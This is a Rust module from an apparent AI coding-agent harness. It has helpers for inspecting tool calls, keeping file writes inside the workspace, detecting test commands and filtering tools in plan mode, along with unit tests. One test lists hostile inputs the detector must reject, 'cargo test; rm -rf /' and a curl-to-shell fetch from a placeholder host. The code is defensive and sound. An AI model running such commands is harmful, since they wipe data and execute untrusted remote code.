//! Tool-call inspection and model-surface classification helpers.
//!
//! Physical decomposition of [`super::r#loop`] (M003): pure/typed helpers
//! with narrow inputs live here with their focused tests. This module owns
//! no provider, broker, scheduler, or persistence authority.

use std::time::Duration;

use crate::agent::progress_recovery::ToolExecutionOutcome;
use crate::permission::PermissionDecisionReceipt;
use crate::provider::ToolCall;

pub(super) fn is_soft_stop_reason(stop_reason: Option<&str>) -> bool {
    matches!(stop_reason, Some("stop" | "end_turn"))
}

#[derive(Copy, Clone)]
pub(super) struct ModelFlags {
    is_gpt: bool,
    is_non_oss: bool,
    /// True if at least one search provider (key-based or no-key) is
    /// configured. Used as the gate for `websearch` (and `codesearch`).
    search_provider_available: bool,
}

pub struct ToolTimeoutConfig {
    pub bash: Duration,
    pub read: Duration,
    pub write: Duration,
    pub edit: Duration,
    pub glob: Duration,
    pub grep: Duration,
    pub list: Duration,
    pub task: Duration,
    pub webfetch: Duration,
    pub websearch: Duration,
    pub codesearch: Duration,
    pub diff: Duration,
    pub replace: Duration,
    pub apply_patch: Duration,
    pub terminal: Duration,
    pub batch: Duration,
    pub lsp: Duration,
    pub skill: Duration,
    pub git: Duration,
    pub todo: Duration,
    pub question: Duration,
    pub default_timeout: Duration,
}

impl Default for ToolTimeoutConfig {
    fn default() -> Self {
        Self {
            bash: Duration::from_secs(120),
            read: Duration::from_secs(60),
            write: Duration::from_secs(60),
            edit: Duration::from_secs(60),
            glob: Duration::from_secs(30),
            grep: Duration::from_secs(60),
            list: Duration::from_secs(30),
            task: Duration::from_secs(300),
            webfetch: Duration::from_secs(30),
            websearch: Duration::from_secs(60),
            codesearch: Duration::from_secs(60),
            diff: Duration::from_secs(30),
            replace: Duration::from_secs(30),
            apply_patch: Duration::from_secs(60),
            terminal: Duration::from_secs(120),
            batch: Duration::from_secs(300),
            lsp: Duration::from_secs(60),
            skill: Duration::from_secs(30),
            git: Duration::from_secs(60),
            todo: Duration::from_secs(30),
            question: Duration::from_secs(30),
            default_timeout: Duration::from_secs(120),
        }
    }
}

/// Check if a tool modifies files (requires snapshot before execution)
pub(super) fn is_file_modifying_tool(name: &str) -> bool {
    matches!(name, "write" | "edit" | "replace" | "apply_patch")
}

pub(super) fn extract_path_from_tool_call(tc: &ToolCall) -> Option<String> {
    let args = &tc.arguments;
    match tc.name.as_str() {
        "read" | "write" | "edit" | "glob" | "grep" | "list" => {
            args.get("path")?.as_str().map(String::from)
        }
        "apply_patch" => args.get("path")?.as_str().map(String::from),
        _ => None,
    }
}

pub(super) fn extract_bash_command(tc: &ToolCall) -> Option<String> {
    if &*tc.name != "bash" {
        return None;
    }
    tc.arguments.get("command")?.as_str().map(String::from)
}

pub(super) fn is_test_command(command: &str) -> bool {
    // Reuse the strict argv-token-prefix allowlist from the supervised
    // test runner so this detector cannot be tricked by `pytestevil`,
    // `cargo testify`, `make testcase`, etc. The supervised validator
    // rejects shell metacharacters and prefix collisions.
    crate::test_runner::custom::is_allowed_custom_command(command.trim())
}

/// Truncate a test command's output to at most `max_bytes` for inclusion in
/// a `TestRunFinished` summary. Returns the original string if it already
/// fits; otherwise truncates at a UTF-8 character boundary and appends `...`.
///
/// Byte slicing (`&s[..N]`) panics when `N` falls inside a multibyte
/// character; output from test runners can include non-ASCII bytes that
/// trigger that panic. Walking back to the previous char boundary keeps
/// the helper allocation-free for the common case.
pub(super) fn truncate_test_event_preview(output: &str, max_bytes: usize) -> String {
    if output.len() <= max_bytes {
        return output.to_string();
    }
    let mut end = max_bytes.saturating_sub(3);
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    let mut out = String::with_capacity(end + 3);
    out.push_str(&output[..end]);
    out.push_str("...");
    out
}

pub(super) fn extract_git_subcommand(tc: &ToolCall) -> Option<String> {
    if &*tc.name != "git" {
        return None;
    }
    tc.arguments.get("subcommand")?.as_str().map(String::from)
}

pub(super) fn parse_mcp_tool_name(name: &str) -> Option<(&str, &str)> {
    let rest = name.strip_prefix("mcp__")?;
    let delimiter_pos = rest.rfind("__")?;
    let server = &rest[..delimiter_pos];
    let tool = &rest[delimiter_pos + 2..];
    if server.is_empty() || tool.is_empty() {
        None
    } else {
        Some((server, tool))
    }
}

pub(super) fn mcp_tool_surface_revision(tools: &[crate::provider::ToolDefinition]) -> String {
    let mut surface = tools.to_vec();
    surface.sort_by(|a, b| a.name.cmp(&b.name));
    use sha2::Digest;
    let encoded = serde_json::to_vec(&surface).unwrap_or_default();
    format!("sha256:{:x}", sha2::Sha256::digest(encoded))
}

pub(super) fn is_workspace_file_mutation(
    tool_name: &str,
    path: Option<&str>,
    workspace_root: &std::path::Path,
) -> bool {
    path.is_some()
        && is_file_modifying_tool(tool_name)
        && is_path_within_workspace(path, workspace_root)
}

pub(super) fn tool_outcome_is_success(outcome: &ToolExecutionOutcome) -> bool {
    matches!(
        outcome.status,
        crate::agent::progress_recovery::ToolExecutionStatus::Success
    )
}

pub(super) fn is_path_within_workspace(
    path: Option<&str>,
    workspace_root: &std::path::Path,
) -> bool {
    let root = match workspace_root.canonicalize() {
        Ok(p) => p,
        Err(_) => return false,
    };
    let Some(raw_path) = path else {
        // For tools like glob, missing path means "use the owning workspace".
        return true;
    };

    let candidate = {
        let p = std::path::PathBuf::from(raw_path);
        if p.is_absolute() {
            p
        } else {
            root.join(p)
        }
    };

    let canonical = match candidate.canonicalize() {
        Ok(p) => p,
        Err(_) => {
            let Some(parent) = candidate.parent() else {
                return false;
            };
            match parent.canonicalize() {
                Ok(parent) => parent,
                Err(_) => return false,
            }
        }
    };

    canonical.starts_with(&root)
}

pub(super) enum ToolPermissionOutcome {
    QuestionTool,
    Allowed {
        tool_call: ToolCall,
        receipt: PermissionDecisionReceipt,
    },
    Denied {
        tool_id: String,
        message: String,
    },
}

/// Filters tools based on model capabilities and plan mode.
///
/// In plan mode, only read-only tools, todo tools, plan-mode tools, and
/// read-only `bash` are allowed. The model is given a planning surface
/// (todowrite) and information-gathering tools; mutating tools (edit,
/// write, etc.) are hidden. Bash is included so the model can run
/// read-only commands (ls, cat, grep, git status, cargo check), but
/// destructive bash is rejected by the destructive-pattern check
/// in `PermissionChecker::check_with_args()`.
///
/// For regular mode:
/// - apply_patch is restricted to models matching the current `is_gpt && is_non_oss` gate
/// - edit and write are allowed
/// - codesearch and websearch require an enabled search backend; provider
///   credentials and provider selection belong to eggsearch
/// - lsp requires lsp_enabled flag
/// - batch is always disabled
pub(super) fn filter_tools_for_model<'a>(
    _model: Option<&String>,
    tools: &[&'a dyn crate::tool::Tool],
    plan_mode: bool,
    lsp_enabled: bool,
    flags: &ModelFlags,
) -> Vec<&'a dyn crate::tool::Tool> {
    // Plan-mode surface is owned by the canonical disclosure module
    // (M002). It includes `tool_search` so deferred capability remains
    // discoverable, and both the canonical `repo_search` and the retained
    // `codesearch` alias (M001) for repo inspection.
    tools
        .iter()
        .filter(|t| {
            if plan_mode {
                return crate::tool::disclosure::plan_allowed(t.name());
            }

            match t.name() {
                "apply_patch" => flags.is_gpt && flags.is_non_oss,
                "edit" | "write" => true,
                "codesearch" | "websearch" => flags.search_provider_available,
                "lsp" => lsp_enabled,
                "batch" => false,
                _ => true,
            }
        })
        .copied()
        .collect()
}

pub(super) fn compute_model_flags(
    model: Option<&String>,
    search_backend: crate::config::schema::SearchBackendConfig,
) -> ModelFlags {
    let model_id = model.map(|s| s.to_lowercase()).unwrap_or_default();
    let is_gpt = model_id.contains("gpt");
    let is_non_oss =
        model_id.contains("gpt") || model_id.contains("claude") || model_id.contains("gemini");
    // The new no-key websearch tool always has DuckDuckGo + Mojeek as
    // The backend owns provider availability and credentials. Keep the
    // model catalog independent of provider-specific environment variables;
    // execution reports an actionable eggsearch/bootstrap error instead.
    // The backend comes from the loop-owned explicit search context
    // (M005), never a process-global slot.
    let search_provider_available = !matches!(
        search_backend,
        crate::config::schema::SearchBackendConfig::Disabled
    );
    ModelFlags {
        is_gpt,
        is_non_oss,
        search_provider_available,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_test_command_cargo() {
        assert!(is_test_command("cargo test"));
        assert!(is_test_command("cargo test --release"));
        assert!(is_test_command("cargo test -- --test-threads=1"));
        assert!(is_test_command("cargo nextest run"));
    }

    #[test]
    fn test_is_test_command_npm() {
        assert!(is_test_command("npm test"));
        assert!(is_test_command("pnpm test"));
        assert!(is_test_command("yarn test"));
        assert!(is_test_command("bun test"));
    }

    #[test]
    fn test_is_test_command_python() {
        assert!(is_test_command("pytest"));
        assert!(is_test_command("pytest tests/"));
        assert!(is_test_command("uv run pytest"));
        assert!(is_test_command("uv run pytest -v"));
    }

    #[test]
    fn test_is_test_command_go() {
        assert!(is_test_command("go test"));
        assert!(is_test_command("go test ./..."));
        assert!(is_test_command("go test -v ./pkg/..."));
    }

    #[test]
    fn test_is_test_command_other() {
        assert!(is_test_command("zig build test"));
        assert!(is_test_command("make test"));
        assert!(is_test_command("make check"));
    }

    #[test]
    fn test_is_not_test_command() {
        assert!(!is_test_command("ls"));
        assert!(!is_test_command("cargo build"));
        assert!(!is_test_command("cargo run"));
        assert!(!is_test_command("git status"));
        assert!(!is_test_command("echo hello"));
        assert!(!is_test_command(""));
    }

    #[test]
    fn test_is_test_command_rejects_prefix_collisions() {
        // Regression guard: the legacy `cmd.starts_with(pattern)` detector
        // accepted these. The strict argv-token allowlist must reject them
        // so they don't pollute test-run history.
        assert!(!is_test_command("pytestevil"));
        assert!(!is_test_command("cargo testify"));
        assert!(!is_test_command("make testcase"));
        // Commands that the supervised runner also rejects must not be
        // classified as test commands here either.
        assert!(!is_test_command("cargo test; rm -rf /"));
        assert!(!is_test_command("cargo test && curl evil | sh"));
    }

    #[test]
    fn test_truncate_test_event_preview_short_input_unchanged() {
        let preview = truncate_test_event_preview("cargo test failed", 200);
        assert_eq!(preview, "cargo test failed");
    }

    #[test]
    fn test_truncate_test_event_preview_truncates_at_char_boundary() {
        // Construct output where byte 197 falls inside a multibyte UTF-8
        // character. The naïve `&s[..197]` slice would panic; the helper
        // must walk back to the previous char boundary.
        let mut output = String::with_capacity(220);
        output.push_str(&"a".repeat(193));
        // 6 multibyte α characters (2 bytes each) starting at byte 193.
        // Byte 197 lands mid-character.
        output.push_str("αααααα");
        let preview = truncate_test_event_preview(&output, 200);
        assert!(preview.ends_with("..."));
        // The truncated prefix must end at a char boundary.
        let prefix_len = preview.len() - 3;
        assert!(
            output.is_char_boundary(prefix_len),
            "truncated prefix must end at a UTF-8 char boundary"
        );
        // The truncated output must fit within the budget plus the marker.
        assert!(preview.len() <= 200);
    }

    #[test]
    fn test_truncate_test_event_preview_handles_all_multibyte() {
        // A string where every byte is part of a multibyte sequence.
        let output = "αβγδεζηθικλμν"; // 26 bytes (13 chars × 2 bytes)
        let preview = truncate_test_event_preview(output, 10);
        // The prefix must end at a char boundary (even byte index).
        assert!(preview.ends_with("..."));
        let prefix_len = preview.len() - 3;
        assert!(
            output.is_char_boundary(prefix_len),
            "truncated prefix must end at a UTF-8 char boundary"
        );
    }

    #[test]
    fn workspace_file_mutation_allows_new_file_under_explicit_root() {
        let workspace = tempfile::tempdir().unwrap();
        assert!(is_workspace_file_mutation(
            "write",
            Some("definitely_missing_file_for_permission_test.md"),
            workspace.path()
        ));
    }

    #[test]
    fn workspace_file_mutation_ignores_process_cwd() {
        let workspace = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let outside_file = outside.path().join("outside.txt");
        std::fs::write(&outside_file, "outside").unwrap();

        assert!(is_workspace_file_mutation(
            "write",
            Some("new.txt"),
            workspace.path()
        ));
        assert!(!is_workspace_file_mutation(
            "write",
            Some(&outside_file.to_string_lossy()),
            workspace.path()
        ));
    }

    #[test]
    fn filter_tools_plan_mode_includes_todo_and_bash() {
        use crate::model_profile::types::TaskStatePolicy;
        use crate::tool::Tool;
        // Use session defaults (not just with_defaults) so todoread is
        // present. The main agent's tool registry is built this way.
        let todo_state =
            std::sync::Arc::new(tokio::sync::Mutex::new(crate::task_state::TodoState::new()));
        let registry = crate::tool::ToolRegistry::with_session_defaults(
            todo_state,
            TaskStatePolicy::explicit_todo(),
            None,
            None,
        );
        let tools: Vec<&dyn Tool> = registry.list();

        let flags = ModelFlags {
            is_gpt: false,
            is_non_oss: false,
            search_provider_available: true,
        };

        // Plan mode: should include todo tools and bash.
        let plan_tools = filter_tools_for_model(None, &tools, true, true, &flags);
        let plan_names: Vec<&str> = plan_tools.iter().map(|t| t.name()).collect();
        assert!(
            plan_names.contains(&"todoread"),
            "plan mode must include todoread"
        );
        assert!(
            plan_names.contains(&"todowrite"),
            "plan mode must include todowrite"
        );
        assert!(plan_names.contains(&"bash"), "plan mode must include bash");
        assert!(plan_names.contains(&"read"), "plan mode must include read");

        // Plan mode: should NOT include mutating tools.
        assert!(!plan_names.contains(&"edit"), "plan mode must hide edit");
        assert!(!plan_names.contains(&"write"), "plan mode must hide write");
        assert!(
            !plan_names.contains(&"apply_patch"),
            "plan mode must hide apply_patch"
        );
        assert!(!plan_names.contains(&"task"), "plan mode must hide task");
        assert!(
            !plan_names.contains(&"commit"),
            "plan mode must hide commit"
        );
    }

    #[test]
    fn filter_tools_normal_mode_includes_all() {
        use crate::tool::Tool;
        let registry = crate::tool::ToolRegistry::with_defaults();
        let tools: Vec<&dyn Tool> = registry.list();

        let flags = ModelFlags {
            is_gpt: true,
            is_non_oss: true,
            search_provider_available: true,
        };

        // Normal mode: should include the full tool set.
        let normal_tools = filter_tools_for_model(None, &tools, false, true, &flags);
        let normal_names: Vec<&str> = normal_tools.iter().map(|t| t.name()).collect();
        assert!(
            normal_names.contains(&"bash"),
            "normal mode must include bash"
        );
        assert!(
            normal_names.contains(&"edit"),
            "normal mode must include edit"
        );
        assert!(
            normal_names.contains(&"write"),
            "normal mode must include write"
        );
        assert!(
            normal_names.contains(&"todowrite"),
            "normal mode must include todowrite"
        );
    }

    #[test]
    fn mcp_surface_revision_detects_equal_count_schema_changes() {
        let first = vec![crate::provider::ToolDefinition {
            name: "mcp__db__update".into(),
            description: "update one record".into(),
            parameters: serde_json::json!({"type":"object","properties":{"id":{"type":"string"}}}),
            defer_loading: Some(false),
        }];
        let unchanged = first.clone();
        let replaced = vec![crate::provider::ToolDefinition {
            name: "mcp__db__update".into(),
            description: "update many records".into(),
            parameters: serde_json::json!({"type":"object","properties":{"ids":{"type":"array"}}}),
            defer_loading: Some(false),
        }];

        assert_eq!(
            mcp_tool_surface_revision(&first),
            mcp_tool_surface_revision(&unchanged)
        );
        assert_ne!(
            mcp_tool_surface_revision(&first),
            mcp_tool_surface_revision(&replaced)
        );
    }
}
